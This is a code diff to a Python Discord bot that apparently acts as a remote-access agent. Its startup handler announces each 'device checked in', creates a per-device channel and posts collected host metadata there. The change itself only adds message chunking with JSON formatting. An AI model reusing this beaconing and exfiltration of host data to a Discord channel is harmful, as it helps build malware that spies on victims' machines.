@@ -21,6 +21,7 @@ from discord.ext import commands
 DISCORD_TOKEN = Path("E:\\CompSci\\lenny_token.txt").read_text(encoding="utf-8")
 CHECKIN_CHANNELS = set()
 LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
+JSON_FORMAT_PREFIX = "```json\n"
 
 """
 TODO: Interesting stuff to add:
@@ -208,6 +209,13 @@ def get_content(upload):
 def do_exit():
     exit()
 
+async def send_long_message(channel, text, prefix="```", suffix="```"):
+    """Split long text into <=2000 char chunks and send sequentially."""
+    max_length = 2000 - len(prefix) - len(suffix)
+    for i in range(0, len(text), max_length):
+        chunk = text[i:i+max_length]
+        await channel.send(f"{prefix}{chunk}{suffix}")
+
 # Runs after Bot() object is created
 @bot.event
 async def on_ready():
@@ -224,14 +232,15 @@ async def on_ready():
         if not existing:
             new_channel = await guild.create_text_channel(channel_name)
             await new_channel.send("📡 New device checked in!")
-            await new_channel.send(metadata_pretty)
+            await send_long_message(new_channel, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
+
             CHECKIN_CHANNELS.add(channel_name)
             LOCKFILE.write_text(str(channel_name), encoding="utf-8")
 
         else:
             CHECKIN_CHANNELS.add(channel_name)
             await existing.send("📡 Device has checked in again!")
-            await existing.send(metadata_pretty)
+            await send_long_message(existing, metadata_pretty, prefix=JSON_FORMAT_PREFIX)
 
 # Runs when a message is seen in any of its channels
 @bot.event
